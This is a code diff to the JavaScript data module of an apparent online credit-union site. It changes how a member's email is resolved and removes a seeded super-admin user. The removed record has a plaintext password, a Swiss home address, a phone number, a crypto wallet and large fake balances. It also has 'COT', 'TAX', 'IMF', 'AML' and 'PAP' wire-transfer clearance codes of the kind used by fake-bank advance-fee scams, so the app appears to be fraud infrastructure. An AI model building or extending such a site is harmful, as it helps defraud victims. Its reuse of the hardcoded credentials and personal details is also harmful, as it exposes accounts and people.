@@ -99,55 +99,21 @@ export function getEffectiveMemberEmail(targetUser = null) {
     const profileRaw = localStorage.getItem('wbcu_user_profile_v1');
     if (profileRaw) {
       const p = JSON.parse(profileRaw);
-      if (p.email && p.email !== 'mizbrymo@gmail.com') return p.email;
+      if (p.email) return p.email;
     }
   } catch (e) {}
   try {
     const active = JSON.parse(localStorage.getItem('wb_credit_union_active_user') || '{}');
-    if (active?.email && active.email !== 'admin@wbcu.net') return active.email;
+    if (active?.email) return active.email;
   } catch (e) {}
-  return 'mizbrymo@gmail.com';
+  try {
+    const adminSess = JSON.parse(sessionStorage.getItem('wb_credit_union_admin_session') || localStorage.getItem('wb_credit_union_admin_session') || '{}');
+    if (adminSess?.email) return adminSess.email;
+  } catch (e) {}
+  return 'admin@wbcu.net';
 }
 
 export const initialSeedUsers = [
-  {
-    id: 'usr-101',
-    fullName: 'Miz Brymo',
-    email: 'mizbrymo@gmail.com',
-    password: '12345',
-    role: 'Super Admin',
-    is_admin: true,
-    phone: '+41 44 915 8901',
-    avatar: 'MB',
-    avatarColor: 'linear-gradient(135deg, #1e40af 0%, #3b82f6 100%)',
-    dob: '1984-06-14',
-    address: '109, Feldgüetliweg, Meilen, Zurich 8706, Switzerland',
-    nationality: 'Switzerland',
-    status: 'active',
-    statusReason: 'Super Admin Clearance',
-    kycStatus: 'verified',
-    createdAt: '2025-01-15T09:30:00Z',
-    lastLogin: new Date().toISOString(),
-    accounts: [
-      { accountNumber: '9482-1049-55', type: 'Checking', name: 'Premier Checking Account', currency: 'USD', balance: 248500.00, status: 'active', routingNumber: '021000089', isPrimary: true },
-      { accountNumber: '9482-1049-56', type: 'Savings', name: 'Swiss High-Yield Wealth Reserve', currency: 'CHF', balance: 1450000.00, status: 'active', routingNumber: '021000089' }
-    ],
-    transactions: [],
-    cards: [
-      { id: 'crd-1', cardNumber: '•••• •••• •••• 1234', cardHolder: 'MIZ BRYMO', type: 'Black Metal Premier', expiry: '09/29', status: 'active', dailyAtmLimit: 10000, onlineLimit: 50000 }
-    ],
-    cryptoWallets: [
-      { currency: 'BTC', balance: 4.85, address: 'bc1q9x48v2m9sl3k0pw84mz789xq4e9', status: 'active' }
-    ],
-    wireTransferCodes: {
-      COT: { code: 'CT-78234', active: true, notes: 'Cost of Transfer clearance token for Swiss SWIFT' },
-      TAX: { code: 'TX-99120', active: true, notes: 'Federal Tax Clearance certificate' },
-      IMF: { code: 'IMF-44912', active: true, notes: 'International Monetary Fund regulatory signoff' },
-      AML: { code: 'AML-00821', active: true, notes: 'Anti-Money Laundering verification key' },
-      PAP: { code: 'PAP-33810', active: true, notes: 'Proof of Anti-Piracy / Source of Wealth code' }
-    },
-    activityLog: []
-  },
   {
     id: 'usr-34400',
     fullName: 'Kristin Willis',
@@ -601,7 +567,9 @@ export function getAdminUsersList() {
   if (stored && stored !== '[]' && stored !== '""') {
     try {
       const parsed = JSON.parse(stored);
-      if (Array.isArray(parsed) && parsed.length > 0) list = parsed;
+      if (Array.isArray(parsed) && parsed.length > 0) {
+        list = parsed.filter((u) => u && u.email !== 'mizbrymo@gmail.com' && u.id !== 'usr-101');
+      }
     } catch {}
   }
 
